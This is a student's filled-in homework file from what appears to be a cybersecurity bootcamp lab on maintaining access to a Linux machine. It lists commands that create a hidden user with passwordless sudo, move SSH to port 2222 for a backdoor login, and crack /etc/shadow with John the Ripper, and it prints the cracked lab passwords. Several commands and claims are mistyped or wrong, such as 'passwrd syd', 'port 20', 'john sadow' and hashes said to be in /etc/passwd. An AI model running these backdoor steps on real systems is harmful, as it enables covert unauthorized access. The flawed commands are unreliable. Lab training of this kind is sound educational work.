## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below
the prompt.

Save and submit the completed file for your homework submission.

\*\*Step 1: Shadow People\*\*

1\. Create a secret user named \`sysd\`. Make sure this user doesn't
have a home folder created:

- \`**useradd -M sysd\`**

2\. Give your secret user a password:

- **\`passwrd syd\`**

3\. Give your secret user a system UID \< 1000:

- \`**usermod -u 600 sysd\`**

4\. Give your secret user the same GID:

- \`**groupmod -g 600 sysd\`**

5\. Give your secret user full \`sudo\` access without the need for a
password:

- ** ran visudo and added the following line**

sysd ALL=(ALL) NOPASSWD:ALL

6\. Test that \`sudo\` access works without your password:

**su sysd**

then opened etc/password I could see all the hashes.

\`\`\`

\*\*Step 2: Smooth Sailing\*\*

1\. Edit the \`sshd_config\` file:

The way I did this was the following

su sysd

sudo nano .etc.ssh.sshd_config

removed the # from port 20 and added a line that says port 2222
underneith.

\*\*Step 3: Testing Your Configuration Update\*\*

1.** Restart the SSH service:**

- ran both

sudo service sshd restart

sudo service ssh restart

I relize I only needed to run the ssh restart.

2\. Exit the \`root\` account:

- **entered in 'exit'**

3\. SSH to the target machine using your \`sysd\` account and port
\`2222\`:

** - \`ssh sysd@192.168.6.105 -p 2222**

4\. Use \`sudo\` to switch to the root user:

- **\`sudo su root**

\*\*Step 4: Crack All the Passwords\*\*

1\. SSH back to the system using your \`sysd\` account and port
\`2222\`:

- **\`\`ssh sysd@192.168.6.105 -p 2222\`**

2\. Escalate your privileges to the \`root\` user. Use John to crack the
entire \`/etc/shadow\` file:

- \`sudo su root

cd /etc/

john sadow\`

results

sysadmin:passw0rd:18387:0:99999:7:::

student:Goodluck!:18387:0:99999:7:::

mitnik:trustno1:18387:0:99999:7:::

babbage:freedom:18387:0:99999:7:::

lovelace:dragon:18387:0:99999:7:::

stallman:computer:18387:0:99999:7:::

turing:lakers:18387:0:99999:7:::

\<iframe width="560" height="315"
src="https://www.youtube.com/embed/XsYnBXvFY6c" title="YouTube video
player" frameborder="0" allow="accelerometer; autoplay; clipboard-write;
encrypted-media; gyroscope; picture-in-picture"
allowfullscreen>\</iframe>

---

Â© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights
Reserved.
